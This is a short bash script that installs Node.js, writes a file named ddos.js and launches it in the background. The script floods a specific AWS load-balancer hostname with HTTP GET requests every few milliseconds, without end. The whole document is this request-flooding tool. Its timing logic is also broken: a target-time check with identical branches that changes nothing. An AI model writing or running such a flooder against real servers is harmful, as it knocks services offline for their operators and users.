#!/bin/bash
sudo apt-get update -y
sudo apt-get upgrade -y
sudo apt-get install nodejs -y
sudo apt-get install npm -y

npm install http

echo "const http = require('http');
const options = {
    hostname: 'kea-004-ws-lb-1607894485.us-east-1.elb.amazonaws.com',
    port: 80,
    method: 'GET'
};

const specificTime = new Date(2023, 12, 11, 06, 30, 0).getTime();

function makeRandomRequest(path) {
    options.path = path;

    const req = http.request(options, (res) => {
        console.log('STATUS for ' + path + ': ' + res.statusCode);
        res.on('data', (chunk) => {
            console.log('BODY: ' + chunk);
        });
    });

    req.on('error', (e) => {
        console.error('problem with request to ' + path + ': ' + e.message);
    });

    req.end();

    const delay = specificTime - Date.now();

    let randomDelay;
    if (delay <= 10 && delay > 0) {
        randomDelay = Math.floor(Math.random() * 10);
    } else {
        randomDelay = Math.floor(Math.random() * 10);
    }

    setTimeout(() => makeRandomRequest(path), randomDelay);
}

makeRandomRequest('/');" > ddos.js

nohup node ddos.js &
